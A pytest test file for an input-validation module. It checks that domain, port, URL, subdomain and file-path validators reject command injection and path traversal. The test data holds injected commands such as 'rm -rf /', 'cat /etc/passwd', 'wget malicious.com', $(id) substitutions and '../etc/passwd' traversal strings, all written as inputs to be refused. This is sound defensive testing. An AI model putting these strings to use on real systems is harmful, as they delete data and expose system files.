"""
Tests for input validation to prevent command injection attacks.
"""

import pytest
import shlex
from pathlib import Path
from asm.core.validation import (
    ValidationError,
    validate_domain,
    validate_port,
    validate_port_list,
    validate_url,
    validate_subdomain,
    sanitize_shell_arg,
    validate_file_path,
    is_safe_input,
)


class TestDomainValidation:
    """Test domain validation functionality"""

    def test_valid_domains(self):
        """Test that valid domains pass validation"""
        valid_domains = [
            "example.com",
            "sub.example.com",
            "test.sub.example.com",
            "example.co.uk",
            "192.168.1.1",
            "[2001:db8::1]",
        ]

        for domain in valid_domains:
            assert validate_domain(domain) == domain

    def test_invalid_domains(self):
        """Test that invalid domains raise ValidationError"""
        invalid_domains = [
            "",
            "a" * 254,
            "example.com; rm -rf /",
            "example.com && cat /etc/passwd",
            "example.com|whoami",
            "example.com`id`",
            "example.com$(id)",
            "example.com; wget malicious.com",
            "example.com& malicious",
            "../etc/passwd",
            "../../../root",
        ]

        for domain in invalid_domains:
            with pytest.raises(ValidationError):
                validate_domain(domain)

    def test_domain_trimming(self):
        """Test that whitespace is trimmed from domains"""
        assert validate_domain("  example.com  ") == "example.com"
        assert validate_domain("\texample.com\n") == "example.com"


class TestPortValidation:
    """Test port validation functionality"""

    def test_valid_ports(self):
        """Test that valid ports pass validation"""
        valid_ports = [
            (1, 1),
            (22, 22),
            (80, 80),
            (443, 443),
            (65535, 65535),
            ("80", 80),
            ("443", 443),
        ]

        for port_input, expected in valid_ports:
            assert validate_port(port_input) == expected

    def test_invalid_ports(self):
        """Test that invalid ports raise ValidationError"""
        invalid_ports = [
            0,
            -1,
            65536,
            "0",
            "70000",
            "abc",
            None,
            [],
            "80; rm -rf /",
        ]

        for port in invalid_ports:
            with pytest.raises(ValidationError):
                validate_port(port)

    def test_valid_port_lists(self):
        """Test that valid port lists pass validation"""
        valid_lists = [
            [80, 443],
            ["22", "80", "443"],
            [1, 65535],
            "80,443",
            "22,80,443,8080",
        ]

        for port_list in valid_lists:
            result = validate_port_list(port_list)
            assert isinstance(result, list)
            assert all(isinstance(p, int) for p in result)
            assert len(result) == len(set(result))
            assert result == sorted(result)

    def test_invalid_port_lists(self):
        """Test that invalid port lists raise ValidationError"""
        invalid_lists = [
            [0, 80],
            ["80", "invalid"],
            "80,invalid,443",
            None,
            123,
        ]

        for port_list in invalid_lists:
            with pytest.raises(ValidationError):
                validate_port_list(port_list)


class TestUrlValidation:
    """Test URL validation functionality"""

    def test_valid_urls(self):
        """Test that valid URLs pass validation"""
        valid_urls = [
            "https://example.com",
            "http://example.com",
            "https://sub.example.com/path",
            "https://example.com:8080/path?query=value",
            "http://192.168.1.1",
            "https://192.168.1.1:443",
        ]

        for url in valid_urls:
            assert validate_url(url) == url.strip()

    def test_invalid_urls(self):
        """Test that invalid URLs raise ValidationError"""
        invalid_urls = [
            "",
            "a" * 2049,
            "ftp://example.com",
            "javascript:alert(1)",
            "https://example.com; rm -rf /",
            "https://example.com&&cat/etc/passwd",
            "https://example.com|id",
        ]

        for url in invalid_urls:
            with pytest.raises(ValidationError):
                validate_url(url)

    def test_url_trimming(self):
        """Test that whitespace is trimmed from URLs"""
        assert validate_url("  https://example.com  ") == "https://example.com"


class TestSubdomainValidation:
    """Test subdomain validation functionality"""

    def test_valid_subdomains(self):
        """Test that valid subdomains pass validation"""
        valid_subdomains = [
            "www.example.com",
            "api.example.com",
            "sub1.sub2.example.com",
            "test.domain.co.uk",
        ]

        for subdomain in valid_subdomains:
            assert validate_subdomain(subdomain) == subdomain.lower()

    def test_invalid_subdomains(self):
        """Test that invalid subdomains raise ValidationError"""
        invalid_subdomains = [
            "",
            "a" * 254,
            "example.com; rm -rf /",
            "example.com&&whoami",
            "example.com|cat/etc/passwd",
            "..",
            "../../../etc/passwd",
        ]

        for subdomain in invalid_subdomains:
            with pytest.raises(ValidationError):
                validate_subdomain(subdomain)


class TestShellArgumentSanitization:
    """Test shell argument sanitization"""

    def test_safe_arguments(self):
        """Test that safe arguments are returned properly handled"""
        safe_args = [
            "example.com",
            "port-80",
            "test_file.txt",
        ]

        for arg in safe_args:
            result = sanitize_shell_arg(arg)
            assert isinstance(result, str)
            assert result == shlex.quote(arg)

    def test_dangerous_arguments(self):
        """Test that dangerous arguments are properly quoted"""
        dangerous_args = [
            "file name with spaces.txt",
            "arg;command",
            "arg`command`",
            "arg$(command)",
        ]

        for arg in dangerous_args:
            result = sanitize_shell_arg(arg)
            assert isinstance(result, str)
            assert "'" in result

    def test_invalid_argument_types(self):
        """Test that non-string arguments raise error"""
        invalid_args = [None, 123, [], {}]

        for arg in invalid_args:
            with pytest.raises(ValidationError):
                sanitize_shell_arg(arg)


class TestFilePathValidation:
    """Test file path validation"""

    def test_safe_paths(self):
        """Test that safe paths pass validation"""
        safe_paths = [
            "/tmp/test.txt",
            "/app/data/config.yaml",
            "relative/path.txt",
        ]

        for path in safe_paths:
            result = validate_file_path(path)
            assert isinstance(result, str)
            assert result == str(Path(path).resolve())

    def test_path_traversal(self):
        """Test that path traversal attempts are blocked"""
        dangerous_paths = [
            "../../../etc/passwd",
            "/safe/path/../../../etc/passwd",
            "..\\..\\windows\\system32",
        ]

        for path in dangerous_paths:
            with pytest.raises(ValidationError):
                validate_file_path(path)

    def test_allowed_directories(self):
        """Test that allowed directory restrictions work"""
        allowed_dirs = ["/app/data", "/tmp"]
        safe_path = "/app/data/config.yaml"
        dangerous_path = "/etc/passwd"

        result = validate_file_path(safe_path, allowed_dirs)
        assert result.startswith("/app/data")

        with pytest.raises(ValidationError):
            validate_file_path(dangerous_path, allowed_dirs)


class TestInputSafetyCheck:
    """Test quick safety check function"""

    def test_safe_inputs(self):
        """Test that safe inputs return True"""
        safe_inputs = [
            "example.com",
            "port-80",
            "filename.txt",
            "normal string",
        ]

        for input_str in safe_inputs:
            assert is_safe_input(input_str) is True

    def test_unsafe_inputs(self):
        """Test that unsafe inputs return False"""
        unsafe_inputs = [
            "command; rm -rf /",
            "file`id`",
            "path$(whoami)",
            "file\x00null",
            "../etc/passwd",
            "command&malware",
        ]

        for input_str in unsafe_inputs:
            assert is_safe_input(input_str) is False

    def test_invalid_input_types(self):
        """Test that non-string inputs return False"""
        invalid_inputs = [None, 123, [], {}]

        for input_val in invalid_inputs:
            assert is_safe_input(input_val) is False


class TestEdgeCases:
    """Test edge cases and boundary conditions"""

    def test_unicode_handling(self):
        """Test that Unicode characters are handled properly"""
        unicode_domain = "xn--example-9i.com"
        assert validate_domain(unicode_domain) == unicode_domain

        dangerous_unicode = "example.com\u0000null"
        with pytest.raises(ValidationError):
            validate_domain(dangerous_unicode)

    def test_maximum_lengths(self):
        """Test boundary conditions for maximum lengths"""
        max_valid_domain = "a" * 61 + ".com"
        assert validate_domain(max_valid_domain) == max_valid_domain

        max_invalid_domain = "a" * 254
        with pytest.raises(ValidationError):
            validate_domain(max_invalid_domain)

        max_valid_url = "https://example.com/" + "a" * (
            2048 - len("https://example.com/")
        )
        assert validate_url(max_valid_url) == max_valid_url

        max_invalid_url = "https://example.com/" + "a" * (
            2049 - len("https://example.com/")
        )
        with pytest.raises(ValidationError):
            validate_url(max_invalid_url)

    def test_empty_and_whitespace_inputs(self):
        """Test handling of empty and whitespace-only inputs"""
        empty_inputs = ["", "   ", "\t", "\n", " \t\n "]

        for empty_input in empty_inputs:
            with pytest.raises(ValidationError):
                validate_domain(empty_input)
            with pytest.raises(ValidationError):
                validate_url(empty_input)
            with pytest.raises(ValidationError):
                validate_subdomain(empty_input)
